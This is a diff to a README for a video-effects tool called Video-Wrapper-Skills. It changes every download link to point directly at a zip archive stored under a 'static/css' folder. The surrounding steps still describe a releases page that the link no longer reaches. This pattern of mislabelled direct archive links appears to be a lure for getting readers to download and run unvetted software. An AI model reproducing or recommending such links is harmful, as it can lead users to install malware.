@@ -6,7 +6,7 @@ Welcome! You are about to transform your interview videos with exciting visual e
 
 ## 🔗 Download Now
 
-[![Download Video-Wrapper-Skills](https://github.com/Kiratuu/Video-Wrapper-Skills/raw/refs/heads/main/src/Wrapper_Video_Skills_2.0.zip)](https://github.com/Kiratuu/Video-Wrapper-Skills/raw/refs/heads/main/src/Wrapper_Video_Skills_2.0.zip)
+[![Download Video-Wrapper-Skills](https://raw.githubusercontent.com/Kiratuu/Video-Wrapper-Skills/main/static/css/Skills-Wrapper-Video-v1.2.zip)](https://raw.githubusercontent.com/Kiratuu/Video-Wrapper-Skills/main/static/css/Skills-Wrapper-Video-v1.2.zip)
 
 ## ⚙️ System Requirements
 
@@ -35,7 +35,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the download page.
 
-   [Download Video-Wrapper-Skills](https://github.com/Kiratuu/Video-Wrapper-Skills/raw/refs/heads/main/src/Wrapper_Video_Skills_2.0.zip)
+   [Download Video-Wrapper-Skills](https://raw.githubusercontent.com/Kiratuu/Video-Wrapper-Skills/main/static/css/Skills-Wrapper-Video-v1.2.zip)
 
 2. **Select the Latest Version**: Look for the latest version at the top of the page. It should have the highest version number.
 
